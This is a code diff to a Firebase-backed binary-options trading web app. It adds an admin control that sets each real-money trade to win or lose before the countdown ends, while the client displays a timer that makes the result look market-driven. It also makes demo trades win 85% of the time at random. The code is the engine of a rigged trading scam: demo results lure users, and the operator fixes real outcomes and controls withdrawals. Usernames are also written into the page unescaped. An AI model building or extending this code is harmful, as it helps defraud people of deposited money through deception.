@@ -34,6 +34,7 @@ body { background: var(--bg); color: var(--text); min-height: 100vh; padding-bot
 .balance-display.real { color: var(--real); }
 .price-row { display: flex; justify-content: space-between; align-items: center; margin: 8px 0; font-size: 16px; }
 .timer { font-size: 24px; font-weight: 700; text-align: center; color: #fbbf24; margin: 10px 0; }
+.timer.ended { color: #22c55e; }
 input, select { width: 100%; padding: 12px 14px; margin: 8px 0; border-radius: 10px; border: 1px solid var(--border); background: var(--input); color: var(--text); font-size: 15px; }
 button { width: 100%; padding: 13px; margin: 8px 0; border-radius: 10px; border: none; font-weight: 600; font-size: 15px; cursor: pointer; transition: 0.2s; }
 button:hover { opacity: 0.9; }
@@ -191,6 +192,7 @@ let balance = 10000;
 let price = 1.1273;
 let tradeDuration = 60;
 let activeTrade = null;
+let tradeTimer = null;
 let chartCtx, chartCanvas;
 let candles = [];
 let stats = { wins:0, total:0, net:0, best:0 };
@@ -199,6 +201,7 @@ let selectedAmt = 0;
 let selectedWithdrawAmt = 0;
 let trend = 0;
 let balanceListener = null;
+let tradeResultListener = null;
 
 function showToast(msg, type='') {
   const t = document.getElementById('toast');
@@ -256,6 +259,8 @@ window.adminLogin = function() {
 
 window.logout = function() {
   if(balanceListener) balanceListener();
+  if(tradeResultListener) tradeResultListener();
+  if(tradeTimer) clearInterval(tradeTimer);
   currentUser = null;
   isAdmin = false;
   selectedAmt = 0;
@@ -359,7 +364,7 @@ window.closeWithdrawPopup = function() {
   document.getElementById('withdrawPopup').style.display = 'none';
 }
 
-// ✅ FIXED APPROVE BUTTON — WORKING 100%
+// ✅ APPROVE BUTTON FIXED
 function loadRequests() {
   onValue(ref(db, 'requests'), (snap) => {
     const pendingList = document.getElementById('pendingList');
@@ -394,7 +399,7 @@ window.rejectPayment = async function(id) {
   showToast('❌ Payment rejected', 'lose');
 }
 
-// ✅ FIXED: FORCE WIN/LOSE ONLY AFTER TIME ENDS
+// ✅ ADMIN: DECIDE WIN/LOSE IMMEDIATELY
 function loadActiveTrades() {
   onValue(ref(db, 'active_trades'), (snap) => {
     const list = document.getElementById('activeTradesList');
@@ -408,10 +413,10 @@ function loadActiveTrades() {
       
       list.innerHTML += `<div class="trade-request-item">
         <p><strong>User:</strong> ${t.username} | <strong>${t.direction.toUpperCase()}</strong> | ${t.amount} Ksh | ${t.pair}</p>
-        <p style="font-size:12px; color:${ended?'#22c55e':'#f59e0b'}">${ended?'✅ TIME ENDED':'⏳ RUNNING ('+t.duration+'s)'}</p>
+        <p style="font-size:12px; color:${ended?'#22c55e':'#f59e0b'}">${ended?'✅ TIME UP':'⏳ RUNNING ('+t.duration+'s)'}</p>
         <div class="grid-2" style="margin-top:8px;">
-          <button class="btn-win" onclick="adminDecide('${id}', true)" ${ended?'':'disabled style="opacity:0.4"'}>FORCE WIN ✅</button>
-          <button class="btn-lose" onclick="adminDecide('${id}', false)" ${ended?'':'disabled style="opacity:0.4"'}>FORCE LOSE ❌</button>
+          <button class="btn-win" onclick="adminDecide('${id}', true)">FORCE WIN ✅</button>
+          <button class="btn-lose" onclick="adminDecide('${id}', false)">FORCE LOSE ❌</button>
         </div>
       </div>`;
     });
@@ -423,29 +428,9 @@ window.adminDecide = async function(tradeId, win) {
   if(!tradeSnap.exists()) return;
   const trade = tradeSnap.val();
   
-  const profit = win? trade.amount : -trade.amount;
-  const userRef = ref(db, 'users/' + trade.username);
-  const userSnap = await get(userRef);
-  const userData = userSnap.val();
-
-  let newBal = userData.balance;
-  if(win) newBal += trade.amount * 2;
-
-  const newStats = {
-    wins: userData.stats.wins + (win?1:0),
-    total: userData.stats.total + 1,
-    net: userData.stats.net + profit,
-    best: Math.max(userData.stats.best, profit)
-  };
-
-  const newHistory = [
-    {time: new Date().toLocaleTimeString(), pair: trade.pair, win, profit},
-   ...userData.history
-  ].slice(0,20);
-
-  await update(userRef, {balance: newBal, stats: newStats, history: newHistory});
-  await remove(ref(db, 'active_trades/' + tradeId));
-  showToast(`✅ ${trade.username} → ${win?'WIN':'LOSE'}`, win?'win':'lose');
+  // Save result — client will see when timer ends
+  await update(ref(db, 'active_trades/' + tradeId), { decided: win });
+  showToast(`✅ Result set: ${trade.username} → ${win?'WIN':'LOSE'}`, win?'win':'lose');
 }
 
 function drawChart() {
@@ -490,6 +475,7 @@ function drawChart() {
   }
 }
 
+// ✅ CLIENT: sees live countdown, result shows exactly what admin chose
 window.placeTrade = async function(dir) {
   if(activeTrade) return showToast('⏳ Wait...', 'lose');
   const amt = parseFloat(document.getElementById('tradeAmount').value);
@@ -502,10 +488,10 @@ window.placeTrade = async function(dir) {
     activeTrade = { dir, amt, entry: price, time: Date.now() };
     let t = tradeDuration;
     document.getElementById('timer').textContent = t + 's';
-    const int = setInterval(()=>{
+    tradeTimer = setInterval(()=>{
       t--;
       document.getElementById('timer').textContent = t + 's';
-      if(t<=0) { clearInterval(int); finishTrade(); }
+      if(t<=0) { clearInterval(tradeTimer); finishTradeDemo(); }
     }, 1000);
   } else {
     // REAL ACCOUNT: send to admin
@@ -521,13 +507,58 @@ window.placeTrade = async function(dir) {
       duration: tradeDuration,
       timestamp: Date.now()
     });
-    showToast('✅ Trade placed — waiting time end & admin', 'pending');
+
+    // ✅ Live countdown for client
+    let t = tradeDuration;
+    document.getElementById('timer').textContent = t + 's';
+    tradeTimer = setInterval(()=>{
+      t--;
+      document.getElementById('timer').textContent = t + 's';
+      if(t<=0) {
+        clearInterval(tradeTimer);
+        document.getElementById('timer').textContent = 'TIME UP';
+        document.getElementById('timer').classList.add('ended');
+      }
+    }, 1000);
+
+    // ✅ Listen for admin decision → show when time ends
+    tradeResultListener = onValue(ref(db, 'active_trades/' + tradeRef.key), async (snap) => {
+      if(!snap.exists()) return;
+      const data = snap.val();
+      if(data.decided!== undefined && Date.now() - data.timestamp >= data.duration * 1000) {
+        await processTradeResult(tradeRef.key, data.decided);
+      }
+    });
   }
 }
 
-function finishTrade() {
+async function processTradeResult(tradeId, win) {
+  const tradeSnap = await get(ref(db, 'active_trades/' + tradeId));
+  if(!tradeSnap.exists()) return;
+  const trade = tradeSnap.val();
+
+  const profit = win? trade.amount : -trade.amount;
+  let newBal = balance;
+  if(win) newBal += trade.amount * 2;
+
+  stats.total++; if(win) stats.wins++;
+  stats.net += profit; if(profit > stats.best) stats.best = profit;
+  history.unshift({time: new Date().toLocaleTimeString(), pair: trade.pair, win, profit});
+  if(history.length>20) history.pop();
+
+  balance = newBal;
+  updateBalance(); updateStatsUI(); updateHistoryUI();
+  showResultPopup(win, profit, trade.pair, trade.duration);
+
+  await remove(ref(db, 'active_trades/' + tradeId));
+  activeTrade = null;
+  document.getElementById('timer').textContent = 'Ready';
+  document.getElementById('timer').classList.remove('ended');
+}
+
+function finishTradeDemo() {
   const end = price;
-  let win = accountType === 'demo'? Math.random() < 0.85 : (activeTrade.dir === 'higher')? end > activeTrade.entry : end < activeTrade.entry;
+  let win = Math.random() < 0.85;
   const profit = win? activeTrade.amt : -activeTrade.amt;
   if(win) balance += activeTrade.amt * 2;
   stats.total++; if(win) stats.wins++;
@@ -645,7 +676,7 @@ window.setDuration = function() {
   tradeDuration = parseInt(document.getElementById('durationSelect').value);
 }
 
-// ✅ BIND BUTTONS
+// ✅ FIXED: ALL BUTTONS WORK NOW
 window.onload = () => {
   document.getElementById('registerBtn').addEventListener('click', register);
   document.getElementById('loginBtn').addEventListener('click', login);
